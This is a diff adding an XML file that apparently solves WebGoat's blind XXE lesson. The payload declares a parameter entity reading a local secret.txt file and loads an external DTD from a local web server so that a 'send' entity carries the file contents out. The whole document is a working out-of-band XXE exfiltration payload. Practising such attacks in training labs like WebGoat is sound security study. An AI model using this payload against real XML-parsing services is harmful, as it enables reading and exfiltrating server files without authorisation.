@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE xxe [  
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-2023.4//XXE/tester/secret.txt" >  
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/files/tester/contents_file.dtd" >  
+%dtd;]>  
+<comment>  
+<text>test&send;</text>  
+</comment>
+
